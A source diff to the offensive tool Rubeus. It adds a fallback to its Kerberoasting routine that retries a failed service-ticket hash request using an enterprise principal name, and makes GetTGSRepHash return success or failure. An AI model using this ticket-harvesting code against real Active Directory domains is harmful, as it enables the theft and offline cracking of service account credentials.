@@ -537,8 +537,14 @@ namespace Rubeus
                             else
                             {
                                 // otherwise use the KerberosRequestorSecurityToken method
-                                GetTGSRepHash(servicePrincipalName, samAccountName, distinguishedName, cred, outFile, simpleOutput);
-                                Helpers.RandomDelayWithJitter(delay, jitter);
+                                bool result = GetTGSRepHash(servicePrincipalName, samAccountName, distinguishedName, cred, outFile, simpleOutput);
+                                if (!result && autoenterprise)
+                                {
+                                    Console.WriteLine("\r\n[-] Retrieving service ticket with SPN failed and '/autoenterprise' passed, retrying with the enterprise principal");
+                                    servicePrincipalName = String.Format("{0}@{1}", samAccountName, domain);
+                                    GetTGSRepHash(servicePrincipalName, samAccountName, distinguishedName, cred, outFile, simpleOutput);
+                                    Helpers.RandomDelayWithJitter(delay, jitter);
+                                }
                             }
                         }
                     }
@@ -576,7 +582,7 @@ namespace Rubeus
             }
         }
 
-        public static void GetTGSRepHash(string spn, string userName = "user", string distinguishedName = "", System.Net.NetworkCredential cred = null, string outFile = "", bool simpleOutput = false)
+        public static bool GetTGSRepHash(string spn, string userName = "user", string distinguishedName = "", System.Net.NetworkCredential cred = null, string outFile = "", bool simpleOutput = false)
         {
             // use the System.IdentityModel.Tokens.KerberosRequestorSecurityToken approach
 
@@ -608,7 +614,7 @@ namespace Rubeus
                 if (!((requestBytes[15] == 1) && (requestBytes[16] == 0)))
                 {
                     Console.WriteLine("\r\n[X] GSSAPI inner token is not an AP_REQ.\r\n");
-                    return;
+                    return false;
                 }
 
                 // ignore the GSSAPI frame
@@ -709,7 +715,9 @@ namespace Rubeus
             catch (Exception ex)
             {
                 Console.WriteLine("\r\n [X] Error during request for SPN {0} : {1}\r\n", spn, ex.InnerException.Message);
+                return false;
             }
+            return true;
         }
 
         public static bool GetTGSRepHash(KRB_CRED TGT, string spn, string userName = "user", string distinguishedName = "", string outFile = "", bool simpleOutput = false, bool enterprise = false, string domainController = "", Interop.KERB_ETYPE requestEType = Interop.KERB_ETYPE.subkey_keymaterial)
